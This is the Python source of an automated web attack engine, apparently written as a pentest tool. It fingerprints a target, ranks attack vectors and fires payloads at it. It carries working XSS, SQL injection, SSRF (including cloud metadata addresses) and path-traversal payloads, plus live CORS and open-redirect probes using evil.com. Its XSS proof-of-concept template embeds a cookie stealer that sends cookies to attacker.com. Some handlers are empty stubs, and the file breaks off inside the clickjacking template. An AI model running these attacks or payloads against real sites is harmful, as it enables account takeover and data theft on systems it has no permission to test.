"""
Intelligent Attack Planner
===========================

An AI-driven attack planning system that thinks like an expert pentester.
Analyzes context, makes intelligent decisions, and chains vulnerabilities.

Key Features:
1. Context-aware decision making
2. Dynamic attack path selection
3. Real-time adaptation based on responses
4. Intelligent payload generation
5. Multi-vector exploitation
6. Automatic severity escalation

SECURITY: Implements secret redaction to prevent credential exposure in reports.

Author: canigetrichpls
"""

import asyncio
import json
import re
import hashlib
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Optional, Callable
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import structlog

logger = structlog.get_logger(__name__)


# =============================================================================
# SECRET REDACTION - Prevent credential exposure in reports
# =============================================================================

# Patterns that indicate sensitive data that should be redacted
SECRET_PATTERNS = [
    r'api[_-]?key',
    r'secret',
    r'password',
    r'passwd',
    r'token',
    r'auth',
    r'credential',
    r'private[_-]?key',
    r'access[_-]?key',
    r'client[_-]?secret',
    r'bearer',
    r'jwt',
]


def redact_secret(value: str, show_chars: int = 4) -> str:
    """
    Redact a secret value, showing only the first few characters.

    SECURITY: Prevents full credential exposure while still allowing
    identification that a secret was found.

    Args:
        value: The secret value to redact
        show_chars: Number of characters to show at the start

    Returns:
        Redacted string like "sk_li****" or "[REDACTED]"
    """
    if not value or len(value) < show_chars + 4:
        return "[REDACTED]"

    visible = value[:show_chars]
    hidden_count = min(len(value) - show_chars, 8)  # Max 8 asterisks
    return f"{visible}{'*' * hidden_count}"


def redact_secrets_in_dict(data: dict[str, Any], depth: int = 0) -> dict[str, Any]:
    """
    Recursively redact secrets in a dictionary.

    SECURITY: Scans dictionary keys and values for secret patterns
    and redacts matching values.

    Args:
        data: Dictionary that may contain secrets
        depth: Current recursion depth (to prevent infinite loops)

    Returns:
        Dictionary with secrets redacted
    """
    if depth > 10:  # Prevent infinite recursion
        return data

    result = {}
    for key, value in data.items():
        key_lower = key.lower()

        # Check if key matches secret patterns
        is_secret_key = any(
            re.search(pattern, key_lower) for pattern in SECRET_PATTERNS
        )

        if is_secret_key and isinstance(value, str):
            result[key] = redact_secret(value)
        elif isinstance(value, dict):
            result[key] = redact_secrets_in_dict(value, depth + 1)
        elif isinstance(value, list):
            result[key] = [
                redact_secrets_in_dict(item, depth + 1) if isinstance(item, dict)
                else redact_secret(item) if is_secret_key and isinstance(item, str)
                else item
                for item in value
            ]
        else:
            result[key] = value

    return result


def redact_secret_list(secrets: list[str]) -> list[str]:
    """
    Redact a list of secret values.

    Args:
        secrets: List of secret strings

    Returns:
        List with all values redacted
    """
    return [redact_secret(s) for s in secrets]


# =============================================================================
# MEMORY LIMITS - Prevent unbounded memory growth
# =============================================================================

# Maximum number of items in various lists to prevent memory exhaustion
MAX_ATTACK_VECTORS = 500
MAX_FINDINGS = 200
MAX_ATTACK_LOG = 1000
MAX_ENDPOINTS = 500
MAX_PARAMETERS = 200
MAX_API_ENDPOINTS = 200


class BoundedList(list):
    """
    A list with a maximum size that discards oldest items when full.

    SECURITY: Prevents memory exhaustion attacks via unbounded growth.
    """

    def __init__(self, maxlen: int, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.maxlen = maxlen

    def append(self, item):
        if len(self) >= self.maxlen:
            self.pop(0)  # Remove oldest item
        super().append(item)

    def extend(self, items):
        for item in items:
            self.append(item)


class AttackPriority(Enum):
    """Priority levels for attack vectors."""
    CRITICAL = 1  # High chance of success, high impact
    HIGH = 2      # Good chance, medium-high impact
    MEDIUM = 3    # Moderate chance
    LOW = 4       # Low chance but worth trying
    SPECULATIVE = 5  # Long shot


class TechStack(Enum):
    """Detected technology stacks."""
    UNKNOWN = "unknown"
    NODE_JS = "nodejs"
    PYTHON = "python"
    PHP = "php"
    JAVA = "java"
    DOTNET = "dotnet"
    RUBY = "ruby"
    GO = "go"


@dataclass
class AttackContext:
    """
    Context gathered during reconnaissance.

    SECURITY: List fields use bounded defaults to prevent memory exhaustion.
    """
    target_url: str
    headers: dict = field(default_factory=dict)
    tech_stack: TechStack = TechStack.UNKNOWN
    endpoints: list = field(default_factory=lambda: BoundedList(MAX_ENDPOINTS))
    parameters: list = field(default_factory=lambda: BoundedList(MAX_PARAMETERS))
    forms: list = field(default_factory=lambda: BoundedList(100))
    js_files: list = field(default_factory=lambda: BoundedList(100))
    api_endpoints: list = field(default_factory=lambda: BoundedList(MAX_API_ENDPOINTS))
    auth_type: str = ""
    has_csrf: bool = True
    has_csp: bool = True
    has_xframe: bool = True
    has_cors: bool = False
    cookies: dict = field(default_factory=dict)
    error_messages: list = field(default_factory=lambda: BoundedList(100))
    disclosed_info: dict = field(default_factory=dict)

    # Attack surface analysis
    reflection_points: list = field(default_factory=lambda: BoundedList(MAX_PARAMETERS))
    file_upload_points: list = field(default_factory=lambda: BoundedList(50))
    redirect_params: list = field(default_factory=lambda: BoundedList(50))
    id_params: list = field(default_factory=lambda: BoundedList(50))
    sql_params: list = field(default_factory=lambda: BoundedList(50))


@dataclass
class AttackVector:
    """A potential attack vector with its context."""
    name: str
    description: str
    priority: AttackPriority
    prerequisites: list = field(default_factory=list)
    target_endpoint: str = ""
    payload_type: str = ""
    expected_impact: str = ""
    success_indicators: list = field(default_factory=list)
    
    # Results
    attempted: bool = False
    successful: bool = False
    evidence: list = field(default_factory=list)
    poc: str = ""


@dataclass
class IntelligentFinding:
    """A finding with full exploitation context."""
    id: str
    title: str
    severity: str
    type: str
    endpoint: str
    description: str
    evidence: list
    poc: str
    attack_chain: list  # Steps taken to discover/exploit
    business_impact: str
    cvss_score: float
    cwe: str
    remediation: str
    is_exploitable: bool = False
    exploitation_complexity: str = "low"


class IntelligentAttacker:
    """
    An intelligent attack planning and execution engine.
    
    Thinks like an expert pentester:
    1. Gather reconnaissance
    2. Analyze attack surface
    3. Prioritize attack vectors
    4. Execute attacks adaptively
    5. Chain vulnerabilities
    6. Generate comprehensive PoCs
    """
    
    # =========================================================================
    # KNOWLEDGE BASE - Expert pentester heuristics
    # =========================================================================
    
    HEADER_ATTACK_MAP = {
        "content-security-policy": {
            "missing_enables": ["xss", "data_injection", "script_injection"],
            "bypass_techniques": [
                "Look for unsafe-inline",
                "Check for unsafe-eval",
                "Find JSONP endpoints for bypass",
                "Check for whitelisted domains with open redirects",
            ],
            "attack_priority": AttackPriority.HIGH,
        },
        "x-frame-options": {
            "missing_enables": ["clickjacking", "ui_redressing"],
            "bypass_techniques": [
                "Check for frame-ancestors in CSP",
                "Look for sensitive state-changing actions",
            ],
            "attack_priority": AttackPriority.MEDIUM,
        },
        "x-content-type-options": {
            "missing_enables": ["mime_sniffing", "content_injection"],
            "bypass_techniques": [
                "Look for user-controlled file uploads",
                "Check for inline content display",
            ],
            "attack_priority": AttackPriority.LOW,
        },
        "strict-transport-security": {
            "missing_enables": ["mitm", "ssl_stripping"],
            "attack_priority": AttackPriority.MEDIUM,
        },
        "access-control-allow-origin": {
            "misconfigured_enables": ["cors_data_theft", "credential_theft"],
            "check_for": ["wildcard", "null", "reflected_origin"],
            "attack_priority": AttackPriority.HIGH,
        },
    }
    
    PARAM_ATTACK_MAP = {
        # Parameters likely vulnerable to specific attacks
        "sqli_params": ["id", "user_id", "item", "category", "order", "sort", "filter", "search", "query"],
        "xss_params": ["q", "search", "query", "name", "message", "comment", "text", "title", "content", "body"],
        "idor_params": ["id", "user_id", "account_id", "order_id", "file_id", "doc_id", "profile_id"],
        "redirect_params": ["url", "redirect", "next", "return", "returnUrl", "goto", "dest", "destination", "redir"],
        "ssrf_params": ["url", "uri", "path", "src", "source", "dest", "redirect", "uri", "domain", "callback"],
        "file_params": ["file", "path", "document", "folder", "root", "template", "page", "include"],
    }
    
    TECH_FINGERPRINTS = {
        "nodejs": ["express", "node", "npm", "connect.sid"],
        "python": ["django", "flask", "python", "werkzeug", "csrftoken"],
        "php": [".php", "PHPSESSID", "laravel", "symfony"],
        "java": [".jsp", "JSESSIONID", "spring", "struts"],
        "dotnet": [".aspx", "ASP.NET", "__VIEWSTATE", "ASP.NET_SessionId"],
        "ruby": ["ruby", "rails", "_session_id", "rack.session"],
    }
    
    SMART_PAYLOADS = {
        "xss": {
            "basic": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
            "filter_bypass": [
                "<ScRiPt>alert(1)</ScRiPt>",  # Case variation
                "<img src=x onerror=alert`1`>",  # Template literal
                "<svg/onload=alert(1)>",  # No space
                "javascript:alert(1)",  # Protocol
                "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",  # HTML entities
                "'-alert(1)-'",  # Breaking out of string
                "\"><script>alert(1)</script>",  # Breaking out of attribute
            ],
            "dom_based": [
                "#<img src=x onerror=alert(1)>",
                "javascript:alert(document.domain)",
            ],
            "csp_bypass": [
                "<script src='https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js'></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>",
            ],
        },
        "sqli": {
            "detection": ["'", "\"", "' OR '1'='1", "1 OR 1=1", "' OR 1=1--", "\" OR 1=1--"],
            "union": [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
            ],
            "error_based": [
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            ],
            "blind": [
                "' AND SLEEP(5)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "'; WAITFOR DELAY '0:0:5'--",
            ],
        },
        "idor": {
            "numeric": lambda x: [str(int(x) - 1), str(int(x) + 1), "0", "1", "-1", str(int(x) * 2)],
            "uuid": lambda x: [x.replace("-", ""), "00000000-0000-0000-0000-000000000000"],
        },
        "ssrf": {
            "internal": [
                "http://127.0.0.1",
                "http://localhost",
                "http://[::1]",
                "http://0.0.0.0",
                "http://169.254.169.254",  # AWS metadata
                "http://metadata.google.internal",  # GCP
            ],
            "bypass": [
                "http://127.0.0.1:80",
                "http://127.1",
                "http://0177.0.0.1",  # Octal
                "http://2130706433",  # Decimal
                "http://127.0.0.1.nip.io",
            ],
        },
        "path_traversal": {
            "basic": ["../", "..\\", "....//", "..;/"],
            "encoded": ["%2e%2e%2f", "%2e%2e/", "..%2f", "%2e%2e%5c"],
            "targets": [
                "../../../../etc/passwd",
                "..\\..\\..\\..\\windows\\win.ini",
                "....//....//....//etc/passwd",
            ],
        },
    }
    
    def __init__(self, http_client=None, rate_limiter=None):
        self.http_client = http_client
        self.rate_limiter = rate_limiter
        self.context = AttackContext(target_url="")
        # SECURITY: Use bounded lists to prevent memory exhaustion
        self.attack_vectors: list[AttackVector] = BoundedList(MAX_ATTACK_VECTORS)
        self.findings: list[IntelligentFinding] = BoundedList(MAX_FINDINGS)
        self.attack_log: list[dict] = BoundedList(MAX_ATTACK_LOG)
        
    async def analyze_and_attack(
        self,
        target_url: str,
        initial_findings: list[dict] = None,
        max_depth: int = 5,
    ) -> list[IntelligentFinding]:
        """
        Main entry point - analyze target and execute intelligent attacks.
        """
        self.context = AttackContext(target_url=target_url)
        initial_findings = initial_findings or []
        
        logger.info(f"[IntelligentAttacker] Starting analysis of {target_url}")
        
        # Phase 1: Enhanced Reconnaissance
        await self._enhanced_recon(target_url, initial_findings)
        
        # Phase 2: Attack Surface Analysis
        self._analyze_attack_surface()
        
        # Phase 3: Prioritize Attack Vectors
        self._prioritize_attacks()
        
        # Phase 4: Execute Attacks Adaptively
        await self._execute_attacks(max_depth)
        
        # Phase 5: Chain Successful Findings
        self._chain_findings()
        
        # Phase 6: Generate Final Report
        return self.findings
    
    # =========================================================================
    # PHASE 1: ENHANCED RECONNAISSANCE
    # =========================================================================
    
    async def _enhanced_recon(self, target_url: str, initial_findings: list[dict]):
        """
        Gather comprehensive reconnaissance data.
        Uses initial findings to guide deeper reconnaissance.
        """
        logger.info("[Recon] Starting enhanced reconnaissance")
        
        # Extract info from initial findings
        for finding in initial_findings:
            finding_type = finding.get("type", "").lower()
            finding_name = finding.get("name", "").lower()
            evidence = finding.get("evidence", [])
            
            # Check for missing headers
            if "missing" in finding_type or "missing" in finding_name:
                if "csp" in finding_name or "content-security" in finding_name:
                    self.context.has_csp = False
                elif "x-frame" in finding_name:
                    self.context.has_xframe = False
                elif "csrf" in finding_name:
                    self.context.has_csrf = False
            
            # Extract disclosed information
            if "disclosure" in finding_type or "info" in finding_type:
                self.context.disclosed_info[finding_type] = evidence
            
            # Collect error messages
            if "error" in finding_type:
                self.context.error_messages.extend(evidence if isinstance(evidence, list) else [evidence])
        
        # Fetch and analyze target
        if self.http_client:
            await self._fetch_and_analyze(target_url)
        
        logger.info(f"[Recon] Context gathered: CSP={self.context.has_csp}, XFrame={self.context.has_xframe}")
    
    async def _fetch_and_analyze(self, url: str):
        """Fetch target and analyze response."""
        try:
            if self.rate_limiter:
                await self.rate_limiter.acquire()
            
            response = await self.http_client.get(url)
            
            # Analyze headers
            self.context.headers = {k.lower(): v for k, v in response.headers.items()}
            
            # Detect tech stack
            self._detect_tech_stack(response)
            
            # Extract endpoints from HTML
            await self._extract_endpoints(url, response.text)
            
            # Analyze JavaScript files
            await self._analyze_js_files(url, response.text)
            
            # Find forms and parameters
            self._extract_forms(url, response.text)
            
            # Check CORS
            await self._check_cors(url)
            
        except Exception as e:
            logger.error(f"[Recon] Fetch error: {e}")
    
    def _detect_tech_stack(self, response):
        """Detect technology stack from response."""
        headers_str = str(self.context.headers).lower()
        body = response.text.lower() if hasattr(response, 'text') else ""
        
        for tech, fingerprints in self.TECH_FINGERPRINTS.items():
            for fp in fingerprints:
                if fp.lower() in headers_str or fp.lower() in body:
                    self.context.tech_stack = TechStack(tech)
                    logger.info(f"[Recon] Detected tech stack: {tech}")
                    return
    
    async def _extract_endpoints(self, base_url: str, html: str):
        """Extract all endpoints from HTML."""
        # URLs in href/src/action
        url_patterns = [
            r'href=["\']([^"\']+)["\']',
            r'src=["\']([^"\']+)["\']',
            r'action=["\']([^"\']+)["\']',
        ]
        
        endpoints = set()
        for pattern in url_patterns:
            matches = re.findall(pattern, html, re.I)
            for match in matches:
                if not match.startswith(('#', 'javascript:', 'mailto:', 'data:')):
                    full_url = urljoin(base_url, match)
                    if urlparse(base_url).netloc in full_url:
                        endpoints.add(full_url)
        
        self.context.endpoints = list(endpoints)
        logger.info(f"[Recon] Found {len(endpoints)} endpoints")
    
    async def _analyze_js_files(self, base_url: str, html: str):
        """Analyze JavaScript files for API endpoints and secrets."""
        js_urls = re.findall(r'src=["\']([^"\']+\.js)["\']', html, re.I)
        
        api_patterns = [
            r'["\']/(api|v\d)/[^"\']+["\']',
            r'fetch\(["\']([^"\']+)["\']',
            r'axios\.[a-z]+\(["\']([^"\']+)["\']',
            r'\.get\(["\']([^"\']+)["\']',
            r'\.post\(["\']([^"\']+)["\']',
        ]
        
        secret_patterns = [
            r'api[_-]?key["\'\s:=]+["\']?([a-zA-Z0-9_-]{20,})',
            r'token["\'\s:=]+["\']?([a-zA-Z0-9_-]{20,})',
            r'secret["\'\s:=]+["\']?([a-zA-Z0-9_-]{20,})',
        ]
        
        for js_url in js_urls[:10]:  # Limit to 10 JS files
            try:
                full_url = urljoin(base_url, js_url)
                if self.rate_limiter:
                    await self.rate_limiter.acquire()
                
                response = await self.http_client.get(full_url)
                js_content = response.text
                
                # Find API endpoints
                for pattern in api_patterns:
                    matches = re.findall(pattern, js_content, re.I)
                    self.context.api_endpoints.extend(matches)
                
                # Find secrets (for reporting, not exploitation)
                # SECURITY: Redact secrets to prevent credential exposure in reports
                for pattern in secret_patterns:
                    matches = re.findall(pattern, js_content, re.I)
                    if matches:
                        # Store redacted versions to prevent credential leakage
                        self.context.disclosed_info["js_secrets"] = redact_secret_list(matches)
                        # Log that secrets were found (without exposing them)
                        logger.warning(
                            f"Found {len(matches)} potential secrets in JS files (redacted in report)"
                        )
                
            except Exception:
                pass
        
        logger.info(f"[Recon] Found {len(self.context.api_endpoints)} API endpoints in JS")
    
    def _extract_forms(self, base_url: str, html: str):
        """Extract forms and their parameters."""
        form_pattern = r'<form[^>]*>(.*?)</form>'
        input_pattern = r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>'
        
        forms = re.findall(form_pattern, html, re.I | re.S)
        
        for form_html in forms:
            params = re.findall(input_pattern, form_html, re.I)
            self.context.parameters.extend(params)
            
            # Categorize parameters
            for param in params:
                param_lower = param.lower()
                
                if any(p in param_lower for p in self.PARAM_ATTACK_MAP["idor_params"]):
                    self.context.id_params.append(param)
                
                if any(p in param_lower for p in self.PARAM_ATTACK_MAP["redirect_params"]):
                    self.context.redirect_params.append(param)
                
                if any(p in param_lower for p in self.PARAM_ATTACK_MAP["xss_params"]):
                    self.context.reflection_points.append(param)
    
    async def _check_cors(self, url: str):
        """Check for CORS misconfigurations."""
        if not self.http_client:
            return
        
        test_origins = ["https://evil.com", "null"]
        
        for origin in test_origins:
            try:
                if self.rate_limiter:
                    await self.rate_limiter.acquire()
                
                response = await self.http_client.get(url, headers={"Origin": origin})
                acao = response.headers.get("Access-Control-Allow-Origin", "")
                
                if origin in acao or acao == "*":
                    self.context.has_cors = True
                    self.context.disclosed_info["cors_vulnerable"] = {
                        "origin": origin,
                        "acao": acao,
                    }
                    logger.info(f"[Recon] CORS misconfiguration detected!")
                    break
                    
            except Exception:
                pass
    
    # =========================================================================
    # PHASE 2: ATTACK SURFACE ANALYSIS
    # =========================================================================
    
    def _analyze_attack_surface(self):
        """
        Analyze the attack surface based on reconnaissance.
        Identify promising attack vectors.
        """
        logger.info("[Analysis] Analyzing attack surface")
        
        # Based on missing headers, create attack vectors
        if not self.context.has_csp:
            self._add_xss_vectors()
        
        if not self.context.has_xframe:
            self._add_clickjacking_vectors()
        
        if self.context.has_cors:
            self._add_cors_vectors()
        
        # Based on discovered parameters
        if self.context.id_params:
            self._add_idor_vectors()
        
        if self.context.redirect_params:
            self._add_redirect_vectors()
        
        if self.context.reflection_points:
            self._add_reflection_xss_vectors()
        
        # Based on API endpoints
        if self.context.api_endpoints:
            self._add_api_vectors()
        
        # Based on tech stack
        self._add_tech_specific_vectors()
        
        logger.info(f"[Analysis] Created {len(self.attack_vectors)} attack vectors")
    
    def _add_xss_vectors(self):
        """Add XSS attack vectors when CSP is missing."""
        # Since CSP is missing, XSS is more likely to work
        
        for param in self.context.parameters[:10]:  # Top 10 params
            self.attack_vectors.append(AttackVector(
                name=f"XSS via {param}",
                description=f"Test XSS in parameter {param} (no CSP protection)",
                priority=AttackPriority.HIGH,
                target_endpoint=self.context.target_url,
                payload_type="xss",
                expected_impact="Account takeover via session hijacking",
                success_indicators=["alert(", "onerror=", "<script"],
            ))
        
        # DOM-based XSS vectors
        self.attack_vectors.append(AttackVector(
            name="DOM XSS via URL hash",
            description="Test DOM-based XSS through URL fragment",
            priority=AttackPriority.MEDIUM,
            payload_type="dom_xss",
            expected_impact="Client-side code execution",
        ))
    
    def _add_clickjacking_vectors(self):
        """Add clickjacking vectors when X-Frame-Options is missing."""
        self.attack_vectors.append(AttackVector(
            name="Clickjacking Attack",
            description="Frame target page for UI redressing",
            priority=AttackPriority.MEDIUM,
            prerequisites=["sensitive_actions_present"],
            payload_type="clickjacking",
            expected_impact="Trick users into unintended actions",
        ))
    
    def _add_cors_vectors(self):
        """Add CORS exploitation vectors."""
        self.attack_vectors.append(AttackVector(
            name="CORS Data Theft",
            description="Steal sensitive data cross-origin",
            priority=AttackPriority.CRITICAL,
            payload_type="cors",
            expected_impact="Sensitive data exfiltration",
        ))
    
    def _add_idor_vectors(self):
        """Add IDOR attack vectors."""
        for param in self.context.id_params:
            self.attack_vectors.append(AttackVector(
                name=f"IDOR via {param}",
                description=f"Test object reference manipulation on {param}",
                priority=AttackPriority.HIGH,
                payload_type="idor",
                expected_impact="Unauthorized data access",
            ))
    
    def _add_redirect_vectors(self):
        """Add open redirect vectors."""
        for param in self.context.redirect_params:
            self.attack_vectors.append(AttackVector(
                name=f"Open Redirect via {param}",
                description=f"Test redirect manipulation on {param}",
                priority=AttackPriority.MEDIUM,
                payload_type="redirect",
                expected_impact="Phishing, OAuth token theft",
            ))
    
    def _add_reflection_xss_vectors(self):
        """Add XSS vectors for reflection points."""
        for param in self.context.reflection_points:
            self.attack_vectors.append(AttackVector(
                name=f"Reflected XSS via {param}",
                description=f"Test reflected XSS in {param}",
                priority=AttackPriority.HIGH if not self.context.has_csp else AttackPriority.MEDIUM,
                payload_type="xss",
                expected_impact="Session hijacking, data theft",
            ))
    
    def _add_api_vectors(self):
        """Add API-specific attack vectors."""
        for endpoint in self.context.api_endpoints[:20]:
            # Auth bypass
            self.attack_vectors.append(AttackVector(
                name=f"Auth Bypass on {endpoint}",
                description="Test unauthorized API access",
                priority=AttackPriority.HIGH,
                target_endpoint=endpoint,
                payload_type="auth_bypass",
                expected_impact="Unauthorized functionality access",
            ))
    
    def _add_tech_specific_vectors(self):
        """Add technology-specific attack vectors."""
        tech = self.context.tech_stack
        
        if tech == TechStack.PHP:
            self.attack_vectors.append(AttackVector(
                name="PHP Type Juggling",
                description="Test type juggling in comparisons",
                priority=AttackPriority.MEDIUM,
                payload_type="type_juggling",
            ))
        
        elif tech == TechStack.NODE_JS:
            self.attack_vectors.append(AttackVector(
                name="Prototype Pollution",
                description="Test for prototype pollution",
                priority=AttackPriority.MEDIUM,
                payload_type="prototype_pollution",
            ))
    
    # =========================================================================
    # PHASE 3: PRIORITIZE ATTACKS
    # =========================================================================
    
    def _prioritize_attacks(self):
        """Sort attack vectors by priority and likelihood of success."""
        
        # Custom scoring based on context
        def score_vector(v: AttackVector) -> int:
            base_score = v.priority.value * 10
            
            # Bonus for missing protections
            if v.payload_type == "xss" and not self.context.has_csp:
                base_score -= 20  # Lower = higher priority
            
            if v.payload_type == "clickjacking" and not self.context.has_xframe:
                base_score -= 15
            
            if v.payload_type == "cors" and self.context.has_cors:
                base_score -= 30  # Already confirmed!
            
            return base_score
        
        self.attack_vectors.sort(key=score_vector)
        
        logger.info(f"[Prioritize] Top vectors: {[v.name for v in self.attack_vectors[:5]]}")
    
    # =========================================================================
    # PHASE 4: EXECUTE ATTACKS
    # =========================================================================
    
    async def _execute_attacks(self, max_depth: int):
        """Execute attack vectors adaptively."""
        logger.info(f"[Attack] Executing up to {len(self.attack_vectors)} attack vectors")
        
        for vector in self.attack_vectors[:max_depth * 3]:  # Limit attacks
            try:
                await self._execute_vector(vector)
                
                # If successful, look for chaining opportunities
                if vector.successful:
                    await self._explore_from_success(vector)
                    
            except Exception as e:
                logger.error(f"[Attack] Error in {vector.name}: {e}")
                vector.evidence.append(f"Error: {e}")
    
    async def _execute_vector(self, vector: AttackVector):
        """Execute a single attack vector."""
        vector.attempted = True
        
        handlers = {
            "xss": self._execute_xss,
            "dom_xss": self._execute_dom_xss,
            "clickjacking": self._execute_clickjacking,
            "cors": self._execute_cors,
            "idor": self._execute_idor,
            "redirect": self._execute_redirect,
            "auth_bypass": self._execute_auth_bypass,
            "sqli": self._execute_sqli,
        }
        
        handler = handlers.get(vector.payload_type)
        if handler:
            await handler(vector)
        
        self.attack_log.append({
            "vector": vector.name,
            "successful": vector.successful,
            "timestamp": datetime.now().isoformat(),
        })
    
    async def _execute_xss(self, vector: AttackVector):
        """Execute XSS attack with intelligent payload selection."""
        target = vector.target_endpoint or self.context.target_url
        
        # Start with basic payloads, escalate if needed
        payload_sets = [
            self.SMART_PAYLOADS["xss"]["basic"],
            self.SMART_PAYLOADS["xss"]["filter_bypass"],
        ]
        
        # If no CSP, try CSP bypass payloads too
        if not self.context.has_csp:
            payload_sets.append(self.SMART_PAYLOADS["xss"]["csp_bypass"])
        
        for payloads in payload_sets:
            for payload in payloads:
                for param in self.context.parameters[:5]:
                    try:
                        if self.rate_limiter:
                            await self.rate_limiter.acquire()
                        
                        test_url = f"{target}?{param}={payload}"
                        response = await self.http_client.get(test_url)
                        
                        # Check if payload is reflected unescaped
                        if payload in response.text:
                            vector.successful = True
                            vector.evidence.append({
                                "url": test_url,
                                "payload": payload,
                                "parameter": param,
                                "response_snippet": response.text[response.text.find(payload)-50:response.text.find(payload)+len(payload)+50],
                            })
                            vector.poc = self._generate_xss_poc(target, param, payload)
                            
                            # Create finding
                            self._create_finding_from_vector(vector, "high", "CWE-79")
                            return
                            
                    except Exception:
                        pass
    
    async def _execute_dom_xss(self, vector: AttackVector):
        """Test DOM-based XSS."""
        # DOM XSS requires different testing approach
        # Would check for dangerous sinks in JS
        pass
    
    async def _execute_clickjacking(self, vector: AttackVector):
        """Execute clickjacking attack."""
        target = self.context.target_url
        
        if not self.context.has_xframe:
            vector.successful = True
            vector.evidence.append({
                "reason": "X-Frame-Options header missing",
                "csp_frame_ancestors": self.context.headers.get("content-security-policy", "not set"),
            })
            vector.poc = self._generate_clickjacking_poc(target)
            self._create_finding_from_vector(vector, "medium", "CWE-1021")
    
    async def _execute_cors(self, vector: AttackVector):
        """Execute CORS exploitation."""
        if self.context.has_cors:
            cors_info = self.context.disclosed_info.get("cors_vulnerable", {})
            
            vector.successful = True
            vector.evidence.append(cors_info)
            vector.poc = self._generate_cors_poc(
                self.context.target_url,
                cors_info.get("origin", "https://evil.com"),
            )
            self._create_finding_from_vector(vector, "high", "CWE-942")
    
    async def _execute_idor(self, vector: AttackVector):
        """Execute IDOR attack."""
        # Would test ID manipulation
        pass
    
    async def _execute_redirect(self, vector: AttackVector):
        """Execute open redirect attack."""
        target = self.context.target_url
        
        evil_urls = [
            "https://evil.com",
            "//evil.com",
            "https://evil.com/fake-login",
        ]
        
        for param in self.context.redirect_params:
            for evil_url in evil_urls:
                try:
                    if self.rate_limiter:
                        await self.rate_limiter.acquire()
                    
                    test_url = f"{target}?{param}={evil_url}"
                    response = await self.http_client.get(test_url, follow_redirects=False)
                    
                    location = response.headers.get("Location", "")
                    if "evil.com" in location:
                        vector.successful = True
                        vector.evidence.append({
                            "url": test_url,
                            "redirect_to": location,
                        })
                        vector.poc = self._generate_redirect_poc(target, param, evil_url)
                        self._create_finding_from_vector(vector, "medium", "CWE-601")
                        return
                        
                except Exception:
                    pass
    
    async def _execute_auth_bypass(self, vector: AttackVector):
        """Test authentication bypass."""
        endpoint = vector.target_endpoint
        
        if not endpoint or not self.http_client:
            return
        
        try:
            if self.rate_limiter:
                await self.rate_limiter.acquire()
            
            # Try without auth
            response = await self.http_client.get(endpoint)
            
            if response.status_code == 200:
                # Check if actual data is returned (not just error page)
                if len(response.text) > 100 and "error" not in response.text.lower():
                    vector.successful = True
                    vector.evidence.append({
                        "endpoint": endpoint,
                        "status": response.status_code,
                        "response_length": len(response.text),
                    })
                    self._create_finding_from_vector(vector, "critical", "CWE-287")
                    
        except Exception:
            pass
    
    async def _execute_sqli(self, vector: AttackVector):
        """Execute SQL injection attack."""
        # Would use SMART_PAYLOADS["sqli"]
        pass
    
    async def _explore_from_success(self, vector: AttackVector):
        """When an attack succeeds, explore related vectors."""
        logger.info(f"[Chain] Exploring from successful vector: {vector.name}")
        
        if vector.payload_type == "xss":
            # XSS found! Try to escalate
            # - Look for admin functionality
            # - Try session hijacking demo
            pass
        
        elif vector.payload_type == "redirect":
            # Open redirect found! Try OAuth chaining
            # - Look for OAuth endpoints
            # - Try token theft chain
            pass
    
    # =========================================================================
    # PHASE 5: CHAIN FINDINGS
    # =========================================================================
    
    def _chain_findings(self):
        """Chain related findings for higher impact."""
        logger.info("[Chain] Analyzing finding chains")
        
        # Example: Missing CSP + XSS = Higher severity
        # Example: Open Redirect + OAuth = Token Theft
        
        xss_findings = [f for f in self.findings if f.type == "xss"]
        redirect_findings = [f for f in self.findings if f.type == "open_redirect"]
        
        # If we have both, document the chain potential
        if xss_findings and not self.context.has_csp:
            for finding in xss_findings:
                finding.description += "\n\n**Chain Potential:** No CSP protection allows full exploitation of this XSS."
                finding.business_impact += " Session hijacking is trivially achievable."
    
    # =========================================================================
    # POC GENERATORS
    # =========================================================================
    
    def _generate_xss_poc(self, target: str, param: str, payload: str) -> str:
        """Generate XSS proof of concept."""
        return f"""<!-- XSS Proof of Concept -->
<!DOCTYPE html>
<html>
<head>
    <title>XSS PoC - {target}</title>
</head>
<body>
    <h1>XSS Vulnerability Proof of Concept</h1>
    
    <h2>Target</h2>
    <p>{target}</p>
    
    <h2>Vulnerable Parameter</h2>
    <p><code>{param}</code></p>
    
    <h2>Payload</h2>
    <pre>{payload}</pre>
    
    <h2>Exploit URL</h2>
    <code>{target}?{param}={payload}</code>
    
    <h2>Click to Test</h2>
    <a href="{target}?{param}={payload}" target="_blank">Execute XSS</a>
    
    <h2>Impact Demonstration</h2>
    <p>This XSS could be used to:</p>
    <ul>
        <li>Steal session cookies: <code>document.cookie</code></li>
        <li>Capture credentials via fake login forms</li>
        <li>Perform actions on behalf of the victim</li>
        <li>Redirect to phishing pages</li>
    </ul>
    
    <h3>Cookie Stealer Example</h3>
    <pre>
&lt;script&gt;
new Image().src='https://attacker.com/steal?c='+document.cookie;
&lt;/script&gt;
    </pre>
</body>
</html>"""
    
    def _generate_clickjacking_poc(self, target: str) -> str:
        """Generate clickjacking proof of concept."""
        return f"""<!-- Clickjacking Proof of Concept -->
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC</title>
    <style>
        body {{
            margin: 0;
            padding: 20px;
            font-family: Arial, sans-serif;
        }}
        .container {{
            position: relative;
            width: 100%;
            height: 600px;
        }}
        iframe {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.3;  /* Set to 0.0001 for real attack */
            z-index: 2;
            border: none;
        }}
        .decoy {{
            position: absolute;
            z-index: 1;
            background: #4CAF50;
            color: white;
            padding: 15px 30px;
